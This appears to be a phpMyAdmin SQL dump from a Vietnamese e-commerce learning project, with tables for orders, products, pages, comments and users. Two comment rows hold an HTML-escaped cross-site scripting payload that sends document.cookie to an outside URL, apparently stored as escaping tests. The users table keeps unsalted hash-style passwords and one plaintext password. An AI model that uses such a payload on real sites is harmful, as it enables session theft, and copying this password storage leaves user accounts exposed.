-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jan 10, 2021 at 05:08 AM
-- Server version: 10.4.13-MariaDB
-- PHP Version: 7.2.31

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `unitop`
--

-- --------------------------------------------------------

--
-- Table structure for table `num_orders`
--

CREATE TABLE `num_orders` (
  `order_id` int(11) NOT NULL,
  `total` varchar(255) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `custom_name` varchar(255) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `city` varchar(255) COLLATE utf8mb4_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Dumping data for table `num_orders`
--

INSERT INTO `num_orders` (`order_id`, `total`, `custom_name`, `city`) VALUES
(1, '100000', 'Phan Văn Cương', 'HaNoi'),
(2, '200000', 'Nguyễn Nhật Minh', 'DaNang'),
(3, '120000', 'Đoàn Minh Hải', 'Hue'),
(4, '150000', 'Đoàn Hải Long', 'HaNoi'),
(5, '4000000', 'Lê Trọng Ninh', 'HaNoi'),
(6, '25000', 'Ngô Tiến Thành', 'DaNang');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_comment`
--

CREATE TABLE `tbl_comment` (
  `comment_id` int(11) NOT NULL,
  `username` varchar(255) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `content` varchar(255) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `user_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Dumping data for table `tbl_comment`
--

INSERT INTO `tbl_comment` (`comment_id`, `username`, `content`, `user_id`) VALUES
(54, 'long14xtnd', 'tốt rồi', 32),
(55, 'long14xtnd', 'tốt rồi', 48),
(56, 'haingai', 'con ông ngãi', 18),
(57, 'long14xtnd', 'tốt rồi', 19),
(65, 'long14xtnd', '<br>tạm biệt</br>', 20),
(66, 'long14xtnd', '<br>tạm biệt</br>', 21),
(67, 'hailong203', '<i>ok chưa</i>', 22),
(73, 'hack 5', '&lt;script&gt;\r\nwindow.location=&quot;http://unitop.vn?cookie=&quot;+document.cookie;\r\n&lt;/script&gt;', 23),
(74, 'long14xtnd', 'sdsasa', 24),
(75, 'dssasa', 'dssfsafa', 25),
(76, 'dssasa', 'dssfsafa', 26),
(77, 'dssasa', 'dssfsafa', 27),
(78, 'long14xtnd', 'dfasfsfassa', 28),
(81, 'long2000.com', '&lt;script&gt; window.location=&quot;http://unitop.vn?cookie=&quot;+document.cookie; &lt;/script&gt;', 29);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_list_product`
--

CREATE TABLE `tbl_list_product` (
  `id` int(11) NOT NULL,
  `product_title` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `price` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `code` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `product_desc` varchar(1000) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `product_content` varchar(1000) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `product_thumb` varchar(1000) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `cat_id` int(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Dumping data for table `tbl_list_product`
--

INSERT INTO `tbl_list_product` (`id`, `product_title`, `price`, `code`, `product_desc`, `product_content`, `product_thumb`, `cat_id`) VALUES
(1, 'Điện thoại iPhone 12 Pro Max 512GB', '43990000', 'UNI#1', 'Đặc điểm nổi bật của iPhone 12 Pro Max 512GB\r\n\r\n        iPhone 12 Pro Max 512GB - đẳng cấp từ tên gọi đến từng chi tiết. Ngay từ khi chỉ là tin đồn thì chiếc smartphone này đã làm đứng ngồi không yên bao “fan cứng” nhà Apple, với những nâng cấp vô cùng nổi bật hứa hẹn sẽ mang đến những trải nghiệm tốt nhất về mọi mặt mà chưa một chiếc iPhone tiền nhiệm nào có được.', '<p>iPhone 12 Pro Max được chế tác từ mặt kính cường lực Ceramic Shield có độ bền gấp 4 lần iPhone tiền nhiệm, phần khung cấu tạo từ thép không gỉ cực kỳ chắc chắn. Mang lại khả năng chống trầy, chống va đập tốt hơn.</p>\r\n        <p><img src=\'https://cdn.tgdd.vn/Products/Images/42/228744/iphone-12-pro-max-512gb-122620-042638.jpg\'></p>', 'https://cdn.tgdd.vn/Products/Images/42/228744/iphone-12-pro-max-512gb-191020-021004-400x400.png', 1),
(2, 'OPPO A93', '7490000', 'UNI#2', 'Tháng 9/2020, OPPO tiếp tục cho ra mắt dòng sản phẩm thuộc phân khúc điện thoại tầm trung được xem là tiếp nối từ OPPO A92 với nhiều điểm được nâng cấp như hiệu năng, hệ thống camera cùng khả năng sạc nhanh 18W với tên gọi OPPO A93.', '<p>Tháng 9/2020, OPPO tiếp tục cho ra mắt dòng sản phẩm thuộc phân khúc điện thoại tầm trung được xem là tiếp nối từ OPPO A92 với nhiều điểm được nâng cấp như hiệu năng, hệ thống camera cùng khả năng sạc nhanh 18W với tên gọi OPPO A93.</p>\r\n        <p><img src=\'https://cdn.tgdd.vn/Products/Images/42/229056/oppo-a93-270620-100622.jpg\'></p>', 'https://cdn.tgdd.vn/Products/Images/42/229056/oppo-a93-trang-14-200x200.jpg', 1),
(3, 'Điện thoại Samsung Galaxy S20+', '23990000', 'UNI#3', 'Chiếc điện thoại Samsung Galaxy S20 Plus - Siêu phẩm với thiết kế màn hình tràn viền, hiệu năng đỉnh cao kết hợp cùng nhiều đột phá về công nghệ dẫn đầu thế giới smartphone', '<p>Thiết kế màn hình tràn viền, siêu mượt 120 Hz\r\n        Thiết kế của chiếc điện thoại Samsung Galaxy S20 Plus là kính kết hợp độc đáo giữa với khung kim loại cùng mặt lưng kính cường lực Gorilla Glass 6 thế hệ mới nhất cho khả năng chống chịu trầy xước và va đập tốt. Màn hình Galaxy S20+ có kích thước 6.7 inch độ phân giải 2K (1440 x 3200 Pixels) sử dụng tấm nền Dynamic AMOLED 2X với khả năng hiển thị màu sắc sắc nét, độ chi tiết cao và sống động.\r\n\r\n        Khung máy được hoàn thiện một cách tỉ mỉ, độ chính xác cao với viền màn hình đã được thiết kế cong nhẹ cho cảm giác dễ dàng cầm nắm, không bị cấn tay hay vô tình chạm vào màn hình.</p>\"\r\n        .\"<p><img src=\'https://cdn.tgdd.vn/Products/Images/42/217936/samsung-galaxy-s20-plus8-1.jpg\'></p>', 'https://cdn.tgdd.vn/Products/Images/42/217936/samsung-galaxy-s20-plus-600x600-fix-600x600.jpg', 1),
(4, 'Điện thoại Vivo V20', '8190000', 'UNI#4', 'Vivo V20 là mẫu smartphone đầy năng động cho giới trẻ khi có thiết kế siêu mỏng, phù hợp với xu hướng hiện đại với nhiều màu sắc thời thượng, cấu hình vượt trội cùng hệ thống camera siêu ấn tượng chắc chắn sẽ mang đến cho bạn những trải nghiệm chụp ảnh tuyệt vời.', '<p>Vivo V20 có thiết kế hiện đại theo xu hướng của những smartphone cao cấp hiện nay với thiết kế nguyên khối kết hợp cùng mặt lưng kính cao cấp tạo nên độ bóng bẩy, ấn tượng ngay từ cái nhìn đầu tiên.Hơn thế nữa, các chi tiết máy được hoàn thiện tỉ mỉ đến từng chi tiết, cạnh viền được bo tròn nhẹ nhàng để tạo nên tổng thể mềm mại, vừa cho vẻ đẹp sang trọng, lại vừa cho cảm giác cầm nắm mượt mà và không bám dấu vân tay.</p>\r\n        <p><img src=\'https://cdn.tgdd.vn/Products/Images/42/228453/vivo-v20-201620-101626.jpg\'></p>', 'https://cdn1.viettelstore.vn/images/Product/ProductImage/medium/961238900.jpeg', 1),
(5, 'Laptop Apple MacBook Air 2017 i5 1.8GHz/8GB/128GB (MQD32SA/A)', '20900000', 'UNI#5', 'MacBook Air 2017 i5 128GB là mẫu laptop văn phòng, có thiết kế siêu mỏng và nhẹ, vỏ nhôm nguyên khối sang trọng. Máy có hiệu năng ổn định, thời lượng pin cực lâu 12 giờ, phù hợp cho hầu hết các nhu cầu làm việc và giải trí.', '<p>Macbook Air 2017 mang những đặc trưng thiết kế của dòng MacBook Air với trọng lượng và độ dày của laptop lần lượt là 1.7 cm và 1.35 kg rất tiện lợi và dễ dàng giúp người dùng không cảm thấy bất tiện khi mang trên vai thường xuyên khi đi học hay đi làm. \r\n\r\n        Đây cũng là chiếc MacBook chính hãng có giá rẻ nhất hiện tại, phù hợp với mọi người tiêu dùng.\r\n\r\n        Khung máy được hoàn thiện một cách tỉ mỉ, độ chính xác cao với viền màn hình đã được thiết kế cong nhẹ cho cảm giác dễ dàng cầm nắm, không bị cấn tay hay vô tình chạm vào màn hình.</p>\r\n        <p><img src=\'https://cdn.tgdd.vn/Products/Images/44/106875/apple-macbook-air-mqd32sa-a-i5-5350u-4.jpg\'></p>', 'https://cdn.tgdd.vn/Products/Images/44/106875/apple-macbook-air-mqd32sa-a-i5-5350u-600x600.jpg', 2),
(6, 'Laptop Apple MacBook Air 2020 i3 1.1GHz 8GB/256GB (MWTJ2SA/A)', '28990000', 'UNI#6', 'Vẫn là ngôn ngữ thiết kế quen thuộc: đẳng cấp - gọn nhẹ, Apple MacBook Air 2020 (MWTJ2SA/A) phiên bản Core i3 Gen 10 mạnh mẽ lại có giá bán hời hơn đáp ứng điều kiện cho những ai muốn sở hữu một con laptop sang xịn nhưng giá không quá cao.', '<p>Thân máy mỏng nhẹ, thiết kế cao cấp\r\n        Không còn xa lạ gì với thiết kế của nhà Apple nữa, MacBook Air 2020 luôn nằm trong top laptop mỏng nhẹ bậc nhất chỉ với 1.29 kg, chỗ dày nhất cũng ở mức 16.1 mm nên việc cầm máy trên tay cũng giống như cầm 1 cuốn sách 150 trang vậy.\r\n        \r\n        Điểm cộng dành cho nhà sản xuất là lớp vỏ từ nhôm tái chế thân thiện với môi trường, hơn nữa lớp vỏ này cũng cho sản phẩm sự sang trọng đẳng cấp hơn.</p>\r\n        <p><img src=\'https://cdn.tgdd.vn/Products/Images/44/226169/apple-macbook-air-2020-i3-mwtj2saa-6k-core-i3.jpg\'></p>', 'https://hc.com.vn/i/ecommerce/media/GS.004175_FEATURE_61669.jpg', 2),
(7, 'Laptop Apple Macbook 12\" MLHF2 Core M 1.2GHz/8GB/512GB (2016)', '38990000', 'UNI#7', 'Vẫn là ngôn ngữ thiết kế quen thuộc: đẳng cấp - gọn nhẹ, Apple MacBook Air 2020 (MWTJ2SA/A) phiên bản Core i3 Gen 10 mạnh mẽ lại có giá bán hời hơn đáp ứng điều kiện cho những ai muốn sở hữu một con laptop sang xịn nhưng giá không quá cao.', '<p>Thân máy mỏng nhẹ, thiết kế cao cấp\r\n        Không còn xa lạ gì với thiết kế của nhà Apple nữa, MacBook Air 2020 luôn nằm trong top laptop mỏng nhẹ bậc nhất chỉ với 1.29 kg, chỗ dày nhất cũng ở mức 16.1 mm nên việc cầm máy trên tay cũng giống như cầm 1 cuốn sách 150 trang vậy.\r\n        \r\n        Điểm cộng dành cho nhà sản xuất là lớp vỏ từ nhôm tái chế thân thiện với môi trường, hơn nữa lớp vỏ này cũng cho sản phẩm sự sang trọng đẳng cấp hơn.</p>\r\n        <p><img src=\'https://cdn.tgdd.vn/Products/Images/44/226169/apple-macbook-air-2020-i3-mwtj2saa-6k-core-i3.jpg\'></p>', 'https://laptopvina.vn/wp-content/uploads/2020/02/new-apple-macbook-2015-_-_22.0.0.jpg', 2),
(8, 'Laptop Apple MacBook Air 2020 M1/8GB/256GB (MGN63SA/A)', '40000000', 'UNI#8', 'Laptop Apple MacBook Air (MGN63SA/A) thuộc dòng laptop cao cấp sang trọng có cấu hình ổn định, thời lượng pin dài, thiết kế mỏng nhẹ sẽ đáp ứng tốt các nhu cầu làm việc của bạn.', '<p>Chip Apple M1 tốc độ xử lý nhanh gấp 3.5 lần thế hệ trước\r\n        Chiếc laptop này được trang bị con chip Apple M1 được sản xuất trên tính trình 5 nm, 8 lõi bao gồm 4 lõi tiết kiệm điện và 4 lõi hiệu suất cao, con chip cho hiệu năng xử lý ổn định ngay cả khi đang chạy các ứng dụng đồ họa 3D hay chỉnh sửa ảnh nhưng chỉ tiêu thụ 1/4 mức điện năng giúp kéo dài thời lượng pin.\r\n        \r\n        Card đồ họa tích hợp 7 nhân GPU đi cùng với chip M1 có hiệu năng mạnh mẽ được cho là ngang với GTX 1050 Ti sau nhiều bài thử nghiệm hiệu năng đồ họa của benchmark, bạn có thể sử dụng nhiều phần mềm đồ họa chuyên nghiệp, chỉnh sửa video mượt mà.</p>\r\n        <p><img src=\'https://cdn.tgdd.vn/Products/Images/44/231244/apple-macbook-air-2020-mgn63saa-011220-091223.jpg\'></p>', 'https://admin.thinkpro.vn//backend/uploads/product/color_images/2020/11/19/macbook-air-2020-1.jpg', 2);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_page`
--

CREATE TABLE `tbl_page` (
  `id` int(11) NOT NULL,
  `page_title` varchar(500) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `create_at` varchar(500) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `page_content` varchar(500) COLLATE utf8mb4_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Dumping data for table `tbl_page`
--

INSERT INTO `tbl_page` (`id`, `page_title`, `create_at`, `page_content`) VALUES
(1, 'Giới thiệu', '01/12/2020', '<p><strong>[Giới thiệu]</strong> is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more r'),
(2, 'Liên hệ', '20/03/2021', '<p><strong>[Liên hệ]</strong> is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more rece');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_product_cat`
--

CREATE TABLE `tbl_product_cat` (
  `id` int(11) NOT NULL,
  `cat_title` varchar(500) COLLATE utf8mb4_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Dumping data for table `tbl_product_cat`
--

INSERT INTO `tbl_product_cat` (`id`, `cat_title`) VALUES
(1, 'Điện thoại'),
(2, 'Macbook'),
(3, 'Loa Bluetooth');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_users`
--

CREATE TABLE `tbl_users` (
  `user_id` int(11) NOT NULL,
  `username` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `fullname` varchar(200) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `email` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `age` varchar(255) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `gender` enum('male','female') COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `password` varchar(40) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `earn` int(11) NOT NULL COMMENT 'Đơn vị$'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Dumping data for table `tbl_users`
--

INSERT INTO `tbl_users` (`user_id`, `username`, `fullname`, `email`, `age`, `gender`, `password`, `earn`) VALUES
(16, 'ninhcute', 'Lê  Trọng Ninh', 'ninhcute@gmail.com', '20', 'male', '0b11b33db8227ade5a07642503c90c6f', 14),
(17, 'ninhcute', 'Lê  Ninh ngu', 'ninhcute@gmail.com', '18', 'male', '0b11b33db8227ade5a07642503c90c6f', 15),
(18, 'minhmom', 'Nguyễn Nhật Minh', 'minhkobede@gmail.com', '35', 'male', 'bd8f226bc953daeecded4f2becc8759f', 20),
(19, 'nguyennhung', 'Nguyễn Thị Nhung', 'nguyennhung@gmail.com', '32', 'female', 'b08e7ba076911f67f8d75b654df47219', 23),
(20, 'ngoclinh', 'Bùi Thị Ngọc Linh', 'ngoclinh@gmail.com', '40', 'female', 'bf594caf716898be4c077a79bd0356bd', 125),
(21, 'anhthuy', 'Mai Ánh Thùy', 'anhthuy@gmail.com', '34', 'female', 'a8897c70badea71a34eb810423fb1860', 300),
(22, 'diemquynh', 'Đinh Diễm Quỳnh', 'diemquynh@gmail.com', '52', 'female', '8f76e15df0f9d5a928ba873b454b3069', 400),
(23, 'doanngoc', 'Đoàn Xuân Ngọc', 'doanngoc@gmail.com', '12', 'male', '164f1bd165d363c5f4246f8513facfab', 23422),
(24, 'doanha', 'Đoàn Thị Phương Hà', 'doanha@gmail.com', '14', 'female', 'ade1a83784cd4dd603845ba8ccc2f04a', 2321),
(25, 'tienthanh', 'Ngô Tiến Thành', 'tienthanh@gmail.com', '17', 'male', 'acd18cb51ccd4572c98c5f03144ee24b', 1234),
(26, 'quangminh', 'Nguyễn Quang Minh', 'quangminh@gmail.com', '19', 'male', '07f2382699ebdbb3e2cd124975ac52d5', 456),
(27, 'quanganh', 'Phùng Quang Anh', 'quanganh@gmail.com', '23', 'male', 'abcc369252ff4f8fa1aef3c459fe796d', 120),
(28, 'ngocanh', 'Đoàn Ngọc Ánh', 'ngocanh@gmail.com', '25', 'male', '616e355741a9aec082e53fb73fd764b2', 90),
(29, 'phamtinh', 'Phạm Thị Tỉnh', 'phamtinh@gmail.com', '30', 'female', '17a78cd518895f5caaab9783b1cea62f', 100),
(30, 'huyenmy', 'Lương Huyền My', 'huyenmy@gmail.com', '24', 'female', '173b300c871fa4065251305319c0b471', 80),
(31, 'vietbac', 'Lương Việt Bắc', 'vietbac@gmail.com', '25', 'male', 'e599c6117c9237562d0ed1d6f955ae10', 234),
(33, 'doannguyen', 'Đoàn Thị Nguyên', 'doannguyen@gmail.com', '63', 'female', '425d96849e485571bc19aa9208c6aa63', 125),
(34, 'thanhnga', 'Lã Thanh Nga', 'thanhnga@gmail.com', '72', 'female', '832388eb9ee3d9166d9dd16ace66447e', 453),
(35, 'thanhtuyen', 'Lê Thanh Tuyền ', 'thanhtuyen@gmail.com', '18', 'female', '8ed1d8b717d780bfc57993b5e491d452', 6532),
(36, 'hoatran', 'Trần Trọng Hòa', 'hoatran@gmail.com', '21', 'male', '5e49caec7b0b2b01c939d2d7259a714a', 732),
(37, 'meocon', 'Mèo Con Đáng Yêu', 'meocon@gmail.com', '28', 'male', 'Meocon!@#', 621),
(38, 'hailong203', 'Đoàn Hải Long', 'longdoan@gmail.com', '21', 'male', 'f9561084355226f0aea53068d1023360', 300),
(39, 'meocon1', 'Mèo con', 'meocon@gmail.com', '25', 'male', '958a8074004c6bb89b5076c7677dc855', 256),
(40, 'longdz123', 'Hải Long', 'long@gmail.com', '22', 'male', 'f9561084355226f0aea53068d1023360', 43);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `num_orders`
--
ALTER TABLE `num_orders`
  ADD PRIMARY KEY (`order_id`);

--
-- Indexes for table `tbl_comment`
--
ALTER TABLE `tbl_comment`
  ADD PRIMARY KEY (`comment_id`);

--
-- Indexes for table `tbl_list_product`
--
ALTER TABLE `tbl_list_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_page`
--
ALTER TABLE `tbl_page`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_product_cat`
--
ALTER TABLE `tbl_product_cat`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_users`
--
ALTER TABLE `tbl_users`
  ADD PRIMARY KEY (`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `num_orders`
--
ALTER TABLE `num_orders`
  MODIFY `order_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `tbl_comment`
--
ALTER TABLE `tbl_comment`
  MODIFY `comment_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=82;

--
-- AUTO_INCREMENT for table `tbl_list_product`
--
ALTER TABLE `tbl_list_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `tbl_page`
--
ALTER TABLE `tbl_page`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `tbl_product_cat`
--
ALTER TABLE `tbl_product_cat`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `tbl_users`
--
ALTER TABLE `tbl_users`
  MODIFY `user_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=41;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
